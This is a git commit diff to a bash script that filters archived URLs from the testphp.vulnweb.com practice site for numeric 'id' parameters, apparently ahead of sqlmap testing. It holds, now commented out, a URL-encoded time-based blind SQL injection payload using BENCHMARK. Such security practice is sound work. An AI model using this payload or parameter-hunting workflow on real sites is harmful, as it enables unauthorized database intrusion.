7a1f22ad1cf88d65ced5a56940f009857602a536
3n93r <hemanth042100@gmail.com>
2025-10-16 10:27:04 +0530

    removed the unwanted bits and hopefull the final update

--- vuln_urls.sh
+++ vuln_urls.sh
@@ -2,25 +2,19 @@
 
 x=1
 i=1
-rm ip_param_url.txt
+rm ip_param_url.txt #done to remove the old ip parameter file
 
 while read -r ln; do
-        if echo "$ln" | grep -q -E "\?id=[0-9]{1,5}$" ;then
+        if echo "$ln" | grep -q -E "\?id=[0-9]{1,5}$" ;then #done to store the urls with the vuln parameter
                 ((x++))
-                echo "this is the while($i) -> if($x)  loop ln= $ln"
                 echo "$ln" >> ip_param_url.txt
         fi
 ((i++))
 done < test.txt
 #-------> got using this cmd -> echo "http://testphp.vulnweb.com/login.php" | waybackurls | tee test.txt <--------
 
-
-echo "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202669%3DBENCHMARK%285000000%2CMD5%280x4a62416c%29%29" >>  ip_param_url.txt
-
-echo "total number of urls with parameters: $i"
-echo "total number of urls with vulnerable parameters: $x"
-
-echo -e "\nokay the next part contains the sql map script\n"
+#echo "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202669%3DBENCHMARK%285000000%2CMD5%280x4a62416c%29%29" >>  ip_param_url.txt
+# ------------commented the above line as that was overiding the ip_param_url file info ------------
 
 while read -r a; do
 echo "line value is: $a"
